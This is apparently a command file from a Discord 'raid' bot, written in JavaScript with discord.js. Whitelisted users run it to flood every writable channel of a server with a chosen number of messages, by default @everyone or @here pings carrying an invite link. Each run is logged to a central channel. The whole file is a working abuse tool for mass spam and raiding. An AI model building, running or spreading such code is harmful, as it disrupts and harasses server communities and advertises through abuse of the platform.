const Discord = require('discord.js');
const db = require('megadb');
const blacklist = new db.crearDB("blacklist");
const serverlist = new db.crearDB("serverlist");
const sexo = '0x410255';

let cooldown = new Set()

module.exports = {
  name: "alert",
  alias: [],

execute (client, message, args){

    if(!blacklist.has(message.author.id)){
        const a = new Discord.MessageEmbed()
        .setDescription("You are not registered in the Whitelist.")
        .setColor(sexo)
         return message.reply({embeds: [a]})
      }
    
      if (serverlist.tiene(message.guild.id)){
        const serverInListEmbed = new Discord.MessageEmbed()
            .setDescription("<:Converter:995595217782718475> This command is not available in this server.")
            .setColor(sexo);
          return message.reply({ embeds: [serverInListEmbed] });
        }

    
      if(cooldown.has(message.author.id)){
        const l = new Discord.MessageEmbed()
        .setDescription(`<:Converter:995595217782718475> ${message.author}, you must wait 7 seconds to use the command.`)
        .setColor(sexo)
        return message.reply({embeds: [l]})
      }
    
      cooldown.add(message.author.id);
    
      setTimeout(() => {
        cooldown.delete(message.author.id);
      }, 7000);

  let cantidad = args[0]
  if(!cantidad){
    const qq = new Discord.MessageEmbed()
    .setDescription("<:Converter:995595217782718475> You must say an amount!.\nMode of use: `.alert [amount] [text]`")
    .setColor(sexo)
    return message.reply({embeds: [qq]})
  }

  if(isNaN(cantidad)){
    const qq = new Discord.MessageEmbed()
    .setDescription("<:Converter:995595217782718475> You must say number!.\nMode of use: `.alert [amount] [text]`")
    .setColor(sexo)
    return message.reply({embeds: [qq]})
  }

  try {

  const argas = ["@everyone\nhttps://discord.gg/hjbvMsB7v5", "@here\nhttps://discord.gg/hjbvMsB7v5"]
    let randomIMG = argas[Math.floor(Math.random() * argas.length)]

  let texto = args.slice(1).join(' ') || randomIMG


  message.guild.channels.cache.forEach((ch) => {
    const permissions = ch.permissionsFor(client.user);
    if (permissions && permissions.has("SEND_MESSAGES")) {
      for (let i = 0; i < cantidad; i++) {
        ch.send(texto, i).catch(err => {
          if (err) {
            console.log("Error sending message:", err);
          }
        });
      }
    } else {
      console.log("Error.");
    }
  });



  const e = new Discord.MessageEmbed()

   
  .setDescription(`<:k_:995595248266915870> alert executed successfully!`)
    .addField("User", `**${message.author.tag}** | **${message.author.id}**`)
   .addField("Server Name", `**${message.guild.name}** | **${message.guild.id}**`)
   .addField("Content", `${texto}`, true)
   .addField("Quantity", `\`${cantidad}\``, true)
  .setColor(sexo)
   .setThumbnail(message.author.displayAvatarURL({format: 'png', dynamic: true}))


  client.channels.cache.get("1186076417142816808").send({embeds: [e]})

} catch (err) {
  const laoo = new Discord.MessageEmbed()
  .setDescription("<:Converter:995595217782718475> Error found")
  .addField("> Command", "`alert`", true)
  .addField("> Error", `\`${err}\``, true)
  .setColor("#410255")

  client.channels.cache.get('1210148130264322119').send({embeds: [laoo]})
}


 }

}